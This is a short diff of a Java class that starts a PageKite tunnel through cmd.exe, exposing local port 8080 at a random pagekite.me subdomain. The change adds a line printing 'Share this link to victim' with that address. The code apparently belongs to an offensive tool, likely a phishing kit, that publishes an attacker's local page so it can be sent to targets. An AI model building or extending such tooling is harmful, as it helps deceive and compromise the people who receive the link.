@@ -37,8 +37,10 @@ public class Command {
         inputFilePath = inputFilePath.replaceAll("\\s", "^ ");
 
         try {
-            ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"\"" + pythonPath + "\\Python" + i + "\\python\" \"" + pageKiteFilePath + "\" 8080 " + getRandom(10) + ".pagekite.me < " + inputFilePath + "\"");
+            String name = getRandom(10);
+            ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"\"" + pythonPath + "\\Python" + i + "\\python\" \"" + pageKiteFilePath + "\" 8080 " + name + ".pagekite.me < " + inputFilePath + "\"");
             pagekiteProcess = processBuilder.start();
+            System.out.println("\nShare this link to victim: "+name+".pagekite.me");
         } catch (Exception e) {
             System.out.println(e);
         }
